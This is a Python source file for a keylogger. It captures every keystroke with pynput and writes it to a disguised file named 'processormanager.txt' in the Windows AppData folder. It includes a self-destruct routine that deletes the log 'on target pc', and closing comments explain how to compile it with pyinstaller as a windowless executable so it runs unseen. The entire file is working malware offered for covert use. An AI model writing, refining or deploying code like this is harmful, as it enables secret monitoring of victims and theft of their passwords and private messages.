import os
from pynput.keyboard import Listener
import time
import threading


class KeyLogger():
    keys = []  # defined everything here so no innit
    count = 0
    flag = 0
    path = os.environ['appdata'] + '\\processormanager.txt'

    # path= 'processormanager.txt' # linux

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            for key in keys:
                k = str(key).replace("'", '')
                if k.find('backspace') > 0:
                    f.write(' Backspace ')
                elif k.find('enter') > 0:
                    f.write('\n')
                elif k.find('shift') > 0:
                    f.write(' Shift ')
                elif k.find('space') > 0:
                    f.write(' ')
                elif k.find('caps_lock') > 0:
                    f.write(' caps lock ')
                elif k.find('Key'):
                    f.write(k)

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, 'rt') as f:
            return f.read()

    def start(self):
        global listener
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def self_destruct(self):
        self.flag = 1
        listener.stop()  # stop the listener
        os.remove(self.path)  # remove the file containing all the keystrokes ,self destruct on target pc


if __name__ == '__main__':  # for standlone
    keylogger = KeyLogger()
    t = threading.Thread(target=keylogger.start)  # no () after keylogger.start
    t.start()
    while keylogger.flag != 1:
        time.sleep(10)
        logs = keylogger.read_logs()
        print(logs)
    # keylogger.self_destruct()  # destroy
    t.join()

# for windows in cmd run - pyinstaller KeyLogger.py --onefile --noconsole
# windows cmd- appdata>roamin> type processmanager.txt
